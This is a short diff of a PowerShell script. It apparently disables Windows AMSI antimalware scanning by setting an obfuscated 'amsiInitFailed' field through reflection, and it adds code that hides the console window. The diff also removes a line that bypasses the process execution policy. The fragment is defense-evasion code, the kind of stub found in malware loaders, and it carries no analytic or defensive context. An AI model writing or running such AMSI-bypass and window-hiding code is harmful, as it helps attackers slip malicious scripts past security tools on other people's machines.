@@ -6,8 +6,6 @@ $field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
 sleep 5
 $field.SetValue($null,$true)
 
-set-ExecutionPolicy Bypass -Scope process
-
 Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
 function Hide-Console
